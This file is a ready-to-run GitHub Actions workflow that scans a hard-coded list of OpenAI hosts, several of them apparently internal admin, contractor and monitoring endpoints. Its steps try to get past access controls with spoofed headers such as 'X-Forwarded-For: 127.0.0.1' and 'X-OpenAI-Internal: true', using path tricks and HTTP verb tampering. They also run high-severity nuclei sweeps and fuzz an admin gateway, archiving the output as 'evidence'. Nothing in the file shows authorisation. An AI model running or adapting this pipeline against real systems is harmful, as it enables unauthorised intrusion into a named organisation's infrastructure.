name: OpenAI-Deep-Scan
on:
  workflow_dispatch:

jobs:
  hyper-hunt:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Advanced Arsenal
        run: |
          go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
          go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
          go install -v github.com/ffuf/ffuf/v2@latest
          pip install arjun
          sudo mv ~/go/bin/* /usr/local/bin/
          mkdir -p wordlists
          # Using a more targeted API wordlist for faster hits
          curl -s https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/api/api-endpoints-res.txt -o wordlists/api.txt
          curl -s https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt -o wordlists/common.txt

      - name: Phase 1:Aggressive Bypass & Method Tampering
        run: |
          cat <<EOF > master_targets.txt
          https://api.openai.com/v1/completionsinternal
          https://admin.unified-8.api.openai.com
          https://higherlevelapi.unified-8.api.openai.com
          https://chat.gateway.unified-79.api.openai.com
          https://memos.auth.ingress.sodium.sci.openai.org
          https://large-langdemo-external-access.auth.ingress.sodium.sci.openai.org
          https://openai-all.auth.ingress.sodium.sci.openai.org
          https://wiki-browser-contractors.auth.ingress.sodium.sci.openai.org
          https://infra-monitoring.auth.ingress.sulfur.sci.openai.org
          https://auth.openai.com
          https://academy.openai.com
          EOF

          # Testing multiple headers AND path normalization (//) at once
          httpx -l master_targets.txt -threads 50 \
            -H "X-OpenAI-Internal: true" \
            -H "X-Forwarded-For: 127.0.0.1" \
            -H "X-Original-URL: /" \
            -path "//" \
            -sc -cl -title -o bypass_results.txt

      - name: Phase 2:Vulnerability Sweep (SSRF/BOLA)
        run: |
          # Adding -itags to focus specifically on high-value API vulnerabilities
          nuclei -l master_targets.txt -severity critical,high -rl 50 -o nuclei_results.txt

      - name: Phase 3:Verb Tampering Fuzzing
        run: |
          # Testing POST and PUT on the admin gateway, which often bypasses 403s on GET
          ffuf -w wordlists/api.txt -u "https://admin.unified-8.api.openai.com/FUZZ" \
            -X POST -H "Content-Type: application/json" -d '{"test":"test"}' \
            -mc 200,401,500 -maxtime 300 -o api_fuzz_results.json

      - name: Phase 4:Full Path Discovery
        run: |
          # Looking for hidden directories on the Sci-Ingress endpoints
          ffuf -w wordlists/common.txt -u "https://memos.auth.ingress.sodium.sci.openai.org/FUZZ" \
            -mc 200,401,500 -t 50 -maxtime 200 -o ingress_fuzz.json

      - name: Archive Results
        uses: actions/upload-artifact@v4
        with:
          name: deep-scan-evidence
          path: |
            bypass_results.txt
            nuclei_results.txt
            api_fuzz_results.json
            ingress_fuzz.json
            
